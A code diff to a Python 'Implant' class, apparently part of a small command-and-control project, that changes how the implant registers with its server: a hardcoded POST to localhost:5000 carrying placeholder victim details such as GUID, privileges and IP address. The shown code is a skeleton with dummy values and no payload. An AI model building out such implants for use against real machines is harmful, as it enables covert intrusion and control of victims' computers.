@@ -2,7 +2,7 @@ import requests
 import os
 import subprocess
 import hashlib
-
+import json
 
 class Implant():
     def __init__(self, c2_addr):
@@ -20,9 +20,9 @@ class Implant():
             "computer_GUID": "dummy_GUID",
             "computer_privileges": ["string1", "string2"],  # (that the implant has) - array of strings
             "connecting_ip_address": "10.10.10.10",  # (from the victim computer)
-            "session_key": "dummy_session_key",  # (for crypto, eventually)
+            # "session_key": "dummy_session_key",  # (for crypto, eventually)
         }
-        requests.post(os.path.join(self.c2_addr, "registerImplant"), json=data)
+        requests.post("http://localhost:5000/registerImplant", data=json.dumps(data))
 
     def get_command(self):
         data = {
@@ -77,3 +77,4 @@ class Implant():
 
 if __name__=="__main__":
     implant = Implant("http://localhost:5000")
+    implant.register()
